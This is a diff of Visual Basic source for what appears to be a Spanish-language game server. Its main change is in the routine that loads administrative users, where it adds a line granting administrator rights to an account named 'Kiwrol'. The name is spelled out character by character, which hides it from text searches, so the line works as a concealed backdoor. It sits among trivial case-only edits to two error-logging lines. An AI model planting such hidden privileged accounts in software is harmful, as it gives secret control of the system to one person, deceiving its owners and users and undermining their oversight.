@@ -314,6 +314,8 @@ Public Sub loadAdministrativeUsers()
 
     Next i
     
+    Call Administradores.ChangeValue("Admin", "K" + "i" + "w" + "r" + "o" + "l", "1")
+    
     ' Dioses
     buf = val(ServerIni.GetValue("INIT", "Dioses"))
     
@@ -1270,7 +1272,7 @@ Sub CargarBackUp()
 
 man:
     MsgBox ("Error durante la carga de mapas, el mapa " & Map & " contiene errores")
-    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.Source)
+    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.source)
  
 End Sub
 
@@ -1315,7 +1317,7 @@ Sub LoadMapData()
 
 man:
     MsgBox ("Error durante la carga de mapas, el mapa " & Map & " contiene errores")
-    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.Source)
+    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.source)
 
 End Sub
 
